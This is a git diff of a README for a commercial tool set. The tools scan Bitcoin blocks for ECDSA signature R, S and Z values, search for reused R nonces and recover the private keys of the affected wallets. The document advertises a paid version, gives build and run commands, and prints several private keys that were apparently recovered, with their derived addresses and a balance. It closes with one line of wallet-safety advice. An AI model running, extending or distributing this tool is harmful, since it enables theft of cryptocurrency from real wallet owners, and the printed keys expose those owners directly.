@@ -1,6 +1,6 @@
-# Blockchain transaction signature RS extraction script
+# Blockchain transaction signature RSZ extraction script
 
-This script connects via RPC to a Bitcoin or compatible blockchain node, scans blocks within a specified range, and extracts the ECDSA signature R and S values from transaction input scripts (`scriptSig`). The extracted information is then saved to a specified output file.
+The script connects to a Bitcoin or compatible blockchain node via RPC, scans a specified range of blocks, and extracts the R, S, and Z values of the ECDSA signature from the transaction input script ("scriptSig"). The extracted information is then saved to the specified output file.
 
 ## Features
 
@@ -119,39 +119,40 @@ Analysis complete.
 The above is the v1.0 free manual filling version. The following introduces the v2.0 paid version that purchased the compressed package password. It is a one-time fee that unlocks all paid items. It is written in C++ and uses nodes to directly extract RSZ values, save them to the document, and then run the matching program script. It supports batch query of repeated R, automatically fills in information and outputs the final private key.
 
 # Build Dependencies
+
 Linux (Debian/Ubuntu)：
 
 1. Update the package list
-
+```
 sudo apt-get update
-
+```
 2. Install the C++ compiler and build tools (if not already installed)
-
+```
 sudo apt-get install build-essential
-
+```
 3. Install the development files for OpenSSL and libcurl
-
+```
 sudo apt-get install libssl-dev libcurl4-openssl-dev
-
+```
 # Compilation
-
+```
 g++ -std=c++17 extract_rsz.cpp -lcurl -lpthread -lssl -lcrypto -Wall -Wextra -O3 -march=native -o extract_rsz
 g++ -std=c++17 -pthread -O3 -o crack_keys crack_keys.cpp -lssl -lcrypto -Wall -Wextra
 g++ extract_rszp.cpp -static -o extract_rszp -I/home/vcpkg/installed/x64-linux/include -L/home/vcpkg/installed/x64-linux/lib -lcpr -lcurl -lssl -lcrypto -lpthread -lz -std=c++17 -Wall -Wextra
-
+```
 # Use and testing
 
 As above, you need to configure the node information rpc_config.json .
-
+```
   "rpc_host": "127.0.0.1",
   "rpc_port": 8332,
   "rpc_user": "8891689",
   "rpc_password": "1111111111111111111111$ddbbda8cbc8c0a8cc32a84d0590f2de17f1f8dc798c4411111111111111111111",
   "num_workers": 4
 }
-
+```
 BTC core wallet bitcoin.conf file configuration in the .bitcoin file directory If you don’t understand, ask AI.
-
+```
 txindex=1
 listen=1
 server=1
@@ -171,9 +172,9 @@ dbcache=8000
 par=4
 datadir=/media/.bitcoin
 debuglogfile=/media/.bitcoin/debug.log
-
+```
 # Instances extracted from 750001 800000
-
+```
 ./extract_rsz -h
 Usage: ./extract_rsz <start_block> <end_block> <output_file>
 
@@ -184,9 +185,9 @@ Progress: 50000/50000 blocks. Total Signatures: 63466929. Rate (overall): 7.54 b
 Processed block range: 750001 - 800000
 Total signatures extracted: 63466929
 Total time: 6634.12 seconds
-
+```
 # 750001.800000.txt The output document content is as follows:
-
+```
 ID: bdb4c770d447739e9a53ac862343a753f50f9e7bf07721b8820eb949964f5c8e
 R : 5362a267cdcd89391979d6b9e279fe9c8b1caf4b76d432cd2600e8dc21f30d4b
 S : 2fa68702df640a3f73c01572736665bee77de0705e5a55a3d2cea9a005da3188
@@ -203,10 +204,11 @@ ID: 76ed258ef48cd9ef643f84b22172536b7e204431f92a1e5ed90ac1cb7c0f46b9
 R : e3fac5013cb64da897797a9aea58e8eeb5f49388f3c30a7a2c9dc16144722d79
 S : 48f35443bf7153b211426355ac2aa528c44f3dcaa21bac87c39d059090eeae99
 Z : dfe7ed29489932a243e1812511eb143be5d7622c775cdffe41de202b472431fe
-
+```
 # crack_keys The obtained data is then run the batch search duplicate R script program.
 
 Run in the data directory, the program script will read. 
+```
 ./crack_keys
 
 ./crack_keys
@@ -219,9 +221,9 @@ Success! Private keys have been found.
   - Detailed logs written to: found_keys.txt
   - Private keys only written to: private_keys_only.txt
     
-
+```
 found_keys.txt The output is as follows.
-
+```
 ====== Private Key Found! ======
 Private Key: f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
 ------
@@ -254,22 +256,23 @@ ID: 2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
 R : d47ce4c025c35ec440bc81d99834a624875161a26bf56ef7fdc0f5d52f843ad1
 S : e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
 Z : fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
-
+```
 private_keys_only.txt The output is as follows.
-
+```
 f1f2f43b4a197650e05eada740d6b0a7bb01628d29052a40a1428d425c06437d
 .
 .
 .
 
 c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
-
+```
 Analyzing these data, we can find that as long as the program script is not fully tested, it is possible to reuse the R value, which will lead to the private key being attacked and leaked. When using a wallet in daily life, you must fully understand the credibility of the wallet and choose a wallet that has been verified for security.
 
 # Let’s verify the data below
-
+```
 https://btc.exan.tech/tx/2b42bc109492cc3f99142e8c2ee7c06cacea675409f26132ac9ced0263c5d9b8
-
+```
+```
 ./extract_rszp -h
 Usage: ./extract_rszp <option> <value>
 Options:
@@ -296,10 +299,10 @@ Starting Program...
      S: e23cc95260e55cb21e9946181c6995848c5def6a4e48db8cd1e483771a0cb9ea
      Z: fc24f4554d719cf0beb70ab05fe6cd5145cfb9a86972f322deee43f4020b4be9
 PubKey: 04dbd0c61532279cf72981c3584fc32216e0127699635c2789f549e0730c059b81ae133016a69c21e23f1859a95f06d52b7bf149a8f2fe4e8535c8a829b449c5ff
-
+```
 
 The attack recovered the private key and after checking, it was found that there had been a large number of transactions.
-
+```
 ./skey c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
 Input Private Key (Hex): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
 Private Key (Hex, 32 bytes): c477f9f65c22cce20657faa5b2d1d8122336f851a508a1ed04e479c34985bf96
@@ -321,7 +324,7 @@ P2SH-P2WPKH:  3CkyhPfgDiifVpZM6YMyTfFoiD4deoCNa2 (Note: Non-standard)
 BECH32:       bc1qwpujld62thm5twkq0hm0uqs0suwtk2fm7ec7jv (Note: Non-standard)
 P2WSH-P2WPKH: bc1qs2swmd4jwajffz0sdfxvgpjjzmsekcvajjq8g0w8mmfrhjp3k7qq3jjt4r (Note: Non-standard)
 
-
+```
 Bitcoin Address:
 ```
 1BFhrfTTZP3Nw4BNy4eX4KFLsn9ZeijcMm   0.1638814 184
